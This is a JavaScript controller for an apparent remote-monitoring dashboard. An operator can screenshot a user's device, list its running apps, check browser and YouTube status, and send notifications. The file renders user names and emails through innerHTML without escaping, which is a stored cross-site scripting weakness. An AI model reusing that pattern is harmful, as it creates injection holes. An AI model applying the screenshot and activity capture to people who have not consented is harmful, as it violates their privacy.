const api = new APIClient();
let currentUserId = null;
let commandPollInterval = null;

// Initialization
document.addEventListener('DOMContentLoaded', () => {
    checkAuth();
    loadDashboard();

    // Auto-refresh stats/users every 10s
    setInterval(() => {
        if (document.visibilityState === 'visible') loadDashboard();
    }, 10000);

    document.getElementById('logoutBtn').addEventListener('click', () => api.logout());
    document.getElementById('refreshUsersBtn').addEventListener('click', loadDashboard);
});

async function checkAuth() {
    if (!localStorage.getItem('access_token')) {
        window.location.href = 'login.html';
    }
}

async function loadDashboard() {
    try {
        const [onlineData, allUsers] = await Promise.all([
            api.getOnlineUsers(),
            api.getAllUsers()
        ]);

        updateStats(onlineData.users.length, allUsers.length);
        renderUserList(allUsers, onlineData.users);
    } catch (err) {
        console.error("Dashboard refresh failed", err);
    }
}

function updateStats(onlineCount, totalCount) {
    document.getElementById('statOnlineUsers').textContent = onlineCount;
    document.getElementById('statTotalUsers').textContent = totalCount;
}

function renderUserList(allUsers, onlineUsers) {
    const listContainer = document.getElementById('usersList');
    const onlineIds = new Set(onlineUsers.map(u => u.user_id));

    listContainer.innerHTML = '';

    allUsers.forEach(user => {
        const isOnline = onlineIds.has(user.id);
        const el = document.createElement('div');
        el.className = `p-3 rounded-lg cursor-pointer transition flex items-center justify-between group ${currentUserId === user.id ? 'bg-blue-600/20 border border-blue-500/50' : 'bg-gray-700/50 hover:bg-gray-700 border border-transparent'}`;
        el.onclick = () => selectUser(user, isOnline);

        el.innerHTML = `
            <div class="flex items-center space-x-3">
                <div class="relative">
                    <div class="w-10 h-10 rounded-full bg-gray-600 flex items-center justify-center text-lg font-bold text-gray-300">
                        ${user.name.charAt(0).toUpperCase()}
                    </div>
                    <div class="absolute -bottom-1 -right-1 w-3.5 h-3.5 rounded-full border-2 border-gray-800 ${isOnline ? 'bg-green-500' : 'bg-gray-500'}"></div>
                </div>
                <div>
                    <h4 class="font-medium text-white group-hover:text-blue-400 transition">${user.name}</h4>
                    <p class="text-xs text-gray-400 truncate w-32">${user.email}</p>
                </div>
            </div>
            <i class="fas fa-chevron-right text-gray-600 group-hover:text-gray-400 ${currentUserId === user.id ? 'text-blue-400' : ''}"></i>
        `;
        listContainer.appendChild(el);
    });
}

function selectUser(user, isOnline) {
    currentUserId = user.id;

    // UI Updates
    document.getElementById('noUserSelected').classList.add('hidden');
    document.getElementById('userControlPanel').classList.remove('hidden');

    document.getElementById('selectedUserName').textContent = user.name;
    document.getElementById('selectedUserDevice').textContent = user.id; // Or device info if available

    const statusEl = document.getElementById('selectedUserStatus');
    statusEl.textContent = isOnline ? 'Online' : 'Offline';
    statusEl.className = `px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wide ${isOnline ? 'bg-green-500/20 text-green-400 border border-green-500/30' : 'bg-gray-700 text-gray-400'}`;

    // Highlight in list
    loadDashboard(); // Re-render list to show selection state

    // Clear logs for new user selection
    // Load History
    loadHistory(user.id);
    clearLogs();
    log(`Selected user: ${user.name}`);
}

async function triggerCommand(commandType) {
    if (!currentUserId) return;

    log(`Sending command: ${commandType}...`);
    try {
        const res = await api.sendCommand(currentUserId, commandType);
        log(`Command SENT. ID: ${res.command_id}`, 'success');

        pollForCommandResult(res.command_id, commandType, currentUserId);

    } catch (err) {
        log(`Failed to send command: ${err.message}`, 'error');
    }
}

async function pollForCommandResult(commandId, type, userId) {
    let attempts = 0;
    const maxAttempts = 15; // 30 seconds

    const interval = setInterval(async () => {
        attempts++;
        if (attempts > maxAttempts) {
            clearInterval(interval);
            log(`Timeout waiting for ${type} result.`, 'warning');
            return;
        }

        try {
            if (type === 'TAKE_SCREENSHOT') {
                const res = await api.getScreenshot(commandId);
                // If 404, it throws error and goes to catch block.
                // If success:
                if (res.url) {
                    clearInterval(interval);
                    log(`Screenshot received!`, 'success');
                    showScreenshot(res.url);
                }
            } else if (type === 'GET_RUNNING_APPS') {
                // Check if command is executed? Or just check apps log?
                // Let's check apps log and see if it's new?
                // Simpler: Just check Command History to see if status is EXECUTED, 
                // then fetch data.
                const history = await api.getCommandHistory(userId);
                const cmd = history.find(c => c.id === commandId);
                if (cmd && cmd.status === 'EXECUTED') {
                    clearInterval(interval);
                    const appsData = await api.getApps(userId);
                    log(`Apps received: ${appsData.apps.length} running.`, 'success');
                    console.log(appsData.apps); // For debug
                    // Show in modal or log? Log detailed
                    const top5 = appsData.apps.slice(0, 5).map(a => a.name).join(', ');
                    log(`Top Apps: ${top5}...`, 'info');
                } else if (cmd && cmd.status === 'FAILED') {
                    clearInterval(interval);
                    log('Command FAILED on client.', 'error');
                }
            } else if (type === 'GET_BROWSER_STATUS') {
                const history = await api.getCommandHistory(userId);
                const cmd = history.find(c => c.id === commandId);
                if (cmd && cmd.status === 'EXECUTED') {
                    clearInterval(interval);
                    const browserData = await api.getBrowser(userId);
                    log(`Browser: ${browserData.browser} (YT: ${browserData.youtube_open})`, 'success');
                }
            }
        } catch (e) {
            // Ignore errors (like 404) while polling
        }

    }, 2000);
}

function showScreenshot(url) {
    const img = document.getElementById('screenshotPreview');
    img.src = url;
    // Reset zoom state
    img.className = "max-w-full max-h-full object-contain cursor-zoom-in transition-transform duration-300 ease-in-out shadow-2xl";

    document.getElementById('downloadLink').href = url;
    document.getElementById('screenshotModal').classList.remove('hidden');
}

function toggleZoom(img) {
    if (img.classList.contains('cursor-zoom-in')) {
        // Zoom In
        img.classList.remove('max-w-full', 'max-h-full', 'object-contain', 'cursor-zoom-in');
        img.classList.add('cursor-zoom-out', 'scale-150'); // Simple scale or remove constraints
        // Actually removing max constraints allows natural size. 
        // Let's rely on remove max-*
    } else {
        // Zoom Out
        img.classList.add('max-w-full', 'max-h-full', 'object-contain', 'cursor-zoom-in');
        img.classList.remove('cursor-zoom-out', 'scale-150');
    }
}

function closeModal() {
    document.getElementById('screenshotModal').classList.add('hidden');
}

async function loadHistory(userId) {
    try {
        const history = await api.getCommandHistory(userId);
        // We could render this... for now just log latest
        if (history.length > 0) {
            const last = history[0];
            document.getElementById('selectedUserLastSeen').textContent = `Last Command: ${last.command} (${last.status})`;
        }
    } catch (e) { }
}


// ------ Logs & Helper UI ------

function log(msg, type = 'info') {
    const logContainer = document.getElementById('outputLog');
    const el = document.createElement('div');
    el.className = 'font-mono text-xs py-1 border-b border-gray-800 last:border-0';

    const time = new Date().toLocaleTimeString();
    let colorClass = 'text-gray-400';
    if (type === 'success') colorClass = 'text-green-400';
    if (type === 'error') colorClass = 'text-red-400';
    if (type === 'warning') colorClass = 'text-yellow-400';

    el.innerHTML = `<span class="text-gray-600 mr-2">[${time}]</span> <span class="${colorClass}">${msg}</span>`;
    logContainer.prepend(el);
}

function clearLogs() {
    document.getElementById('outputLog').innerHTML = '';
}

// ------ Modals ------

function showNotifyModal() {
    if (!currentUserId) return;
    document.getElementById('notifyModal').classList.remove('hidden');
}

function closeNotifyModal() {
    document.getElementById('notifyModal').classList.add('hidden');
}

async function sendNotification() {
    const title = document.getElementById('notifyTitle').value;
    const msg = document.getElementById('notifyMessage').value;

    if (!title || !msg) return;

    try {
        await api.sendNotification(currentUserId, title, msg);
        log(`Notification sent: "${title}"`, 'success');
        closeNotifyModal();
    } catch (err) {
        log(`Failed to send notification: ${err.message}`, 'error');
    }
}
